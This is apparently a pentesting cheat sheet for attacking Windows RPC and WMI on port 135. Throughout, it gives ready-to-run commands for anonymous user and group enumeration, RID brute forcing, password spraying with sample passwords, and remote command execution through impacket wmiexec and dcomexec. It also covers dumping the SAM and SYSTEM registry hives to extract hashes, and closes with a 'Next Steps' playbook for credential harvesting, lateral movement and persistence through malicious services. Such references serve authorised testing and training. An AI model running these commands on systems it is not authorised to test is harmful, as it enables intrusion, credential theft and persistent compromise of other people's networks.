# WMI/MSRPC Enumeration (135)

## Run nmap RPC scripts
```bash
nmap -p 135 --script=msrpc-enum,rpc-grind $IP
```

## Enumerate RPC endpoints with rpcinfo
```bash
rpcinfo -p $IP
```

## Enumerate RPC endpoints with impacket
```bash
impacket-rpcmap $IP
```

## Connect with rpcclient anonymously
```bash
rpcclient -U "" -N $IP
```

## Enumerate domain users with rpcclient
```bash
rpcclient -U "" -N $IP -c enumdomusers
```

## Enumerate domain groups with rpcclient
```bash
rpcclient -U "" -N $IP -c enumdomgroups
```

## Query user by RID with rpcclient
```bash
rpcclient -U "" -N $IP -c "queryuser 500"
```

## Query domain information with rpcclient
```bash
rpcclient -U "" -N $IP -c querydominfo
```

## Enumerate shares with rpcclient
```bash
rpcclient -U "" -N $IP -c netshareenum
```

## Enumerate printers with rpcclient
```bash
rpcclient -U "" -N $IP -c enumprinters
```

## Test null session with netexec
```bash
netexec smb $IP -u '' -p ''
```

## Enumerate users with netexec
```bash
netexec smb $IP -u '' -p '' --users
```

## RID brute force with netexec
```bash
netexec smb $IP -u guest -p '' --rid-brute
```

## Enumerate users with impacket-lookupsid
```bash
impacket-lookupsid guest@$IP
```

## Query WMI service info with credentials
```bash
impacket-wmiquery domain.local/username:password@$IP "SELECT * FROM Win32_Service"
```

## Execute commands via WMI
```bash
impacket-wmiexec domain.local/username:password@$IP
```

## Execute commands via DCOM
```bash
impacket-dcomexec domain.local/username:password@$IP
```

## Query registry via RPC
```bash
impacket-reg domain.local/username:password@$IP query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
```

---

# WMI/MSRPC Enumeration Methodology

## Initial Reconnaissance

1. Check if RPC port 135 is open
2. Enumerate RPC endpoints and services
3. Test for null/anonymous session access
4. Enumerate users, groups, and shares
5. Attempt RID cycling for user discovery
6. If credentials obtained, leverage WMI for further access

## Anonymous RPC Access

**rpcclient null session:**
Many older Windows systems allow anonymous RPC connections. This permits extensive enumeration without credentials.

**Common rpcclient commands:**
- enumdomusers: List all domain users
- enumdomgroups: List all domain groups
- queryuser [RID]: Get detailed user information
- querygroupmem [RID]: Get group membership
- querydominfo: Get domain information
- netshareenum: List network shares
- enumprinters: List printers

**Exit rpcclient:**
Type `exit` or press Ctrl+D

## Null Session Testing

**Tools for null session testing:**
- rpcclient: Manual RPC interaction
- netexec: Automated enumeration
- enum4linux-ng: Comprehensive null session enumeration
- smbclient: SMB null session testing

**What null sessions reveal:**
- User account names and details
- Group names and memberships
- Share names and permissions
- Password policy
- Domain SID and information
- Trust relationships

## RID Cycling Attack

**What is RID cycling:**
Relative Identifiers (RIDs) are sequential numbers assigned to user and group objects. By querying RIDs sequentially, you can discover all users and groups.

**Manual RID cycling:**
```bash
rpcclient -U "" -N $IP
for i in $(seq 500 1100); do queryuser $i; done
```

**Common RIDs:**
- 500: Administrator
- 501: Guest
- 512: Domain Admins
- 513: Domain Users
- 514: Domain Guests
- 515: Domain Computers
- 516: Domain Controllers

**Automated RID cycling:**
- impacket-lookupsid: Efficient RID enumeration
- netexec --rid-brute: Comprehensive brute force
- ridenum: Specialized RID cycling tool

## WMI Enumeration

**Requires valid credentials:**
WMI queries require authentication, unlike some RPC null session operations.

**Common WMI queries:**

**System information:**
```
SELECT * FROM Win32_ComputerSystem
SELECT * FROM Win32_OperatingSystem
```

**Running processes:**
```
SELECT * FROM Win32_Process
```

**Services:**
```
SELECT * FROM Win32_Service
```

**Network configuration:**
```
SELECT * FROM Win32_NetworkAdapterConfiguration
```

**User accounts:**
```
SELECT * FROM Win32_UserAccount
```

**Installed software:**
```
SELECT * FROM Win32_Product
```

## Password Spraying via RPC

Once users are enumerated:
1. Create username list from enumeration
2. Test common passwords across all users
3. Use netexec for efficient testing
4. Be careful of account lockout policies

**Common passwords to test:**
- Password123!
- Welcome123!
- CompanyName2024!
- Summer2024!

## WMI Command Execution

**impacket-wmiexec:**
Semi-interactive shell via WMI. Requires admin credentials.

**impacket-dcomexec:**
Alternative execution method using DCOM. May work when WMI is blocked.

**Advantages of WMI execution:**
- No SMB required (uses RPC)
- Stealthier than PSExec
- Works through many firewalls

## Domain Information Gathering

**rpcclient domain enumeration:**
```bash
rpcclient -U "" -N $IP
querydominfo      # Domain details
enumdomains       # List domains
lsaquery          # Get domain SID
getdompwinfo      # Password policy
enumtrust         # Trust relationships
```

**Password policy information:**
Critical for planning brute force/spray attacks:
- Minimum password length
- Password complexity requirements
- Account lockout threshold
- Lockout duration
- Password history

## Trust Relationships

**Enumerate trusts via RPC:**
```bash
rpcclient -U "" -N $IP
enumtrust
```

Trusts reveal relationships between domains, useful for lateral movement.

## Registry Access via RPC

**impacket-reg usage:**
Query and backup registry hives remotely.

**Common targets:**
- HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run (autostart programs)
- HKLM\SAM (user account hashes)
- HKLM\SYSTEM (system configuration)
- HKLM\SECURITY (security policy)

**Backup SAM/SYSTEM:**
```bash
impacket-reg domain.local/user:pass@$IP backup -keyName HKLM\\SAM
impacket-reg domain.local/user:pass@$IP backup -keyName HKLM\\SYSTEM
```

Then extract hashes with secretsdump or samdump2.

## Service Manipulation

**impacket-services:**
List, create, start, and stop services remotely.

**Persistence via services:**
Create malicious service for persistence or privilege escalation.

## Common RPC Ports

- 135/tcp: RPC Endpoint Mapper
- 139/tcp: NetBIOS Session Service
- 445/tcp: SMB over TCP
- 593/tcp: RPC over HTTP
- 1024+: Dynamic RPC ports

## Enumeration Checklist

- [ ] Anonymous RPC access testing
- [ ] User and group enumeration
- [ ] Domain information gathering
- [ ] RID cycling for complete user list
- [ ] Share enumeration via RPC
- [ ] Password policy extraction
- [ ] Trust relationship enumeration
- [ ] WMI queries (if creds available)
- [ ] Registry access attempts

## Common Misconfigurations

1. **Anonymous RPC access enabled** (common on older systems)
2. **Weak or default credentials**
3. **Over-privileged service accounts**
4. **Unrestricted WMI access**
5. **Weak password policies** revealed via RPC

## Next Steps

Once RPC enumeration succeeds:
1. Use discovered users for password attacks
2. Test obtained credentials on other services
3. Leverage WMI for command execution
4. Extract registry data for credential harvesting
5. Create persistence via services

---

# References

- https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc
- https://github.com/SecureAuthCorp/impacket
- https://0xdf.gitlab.io/cheatsheets/rpc-enum
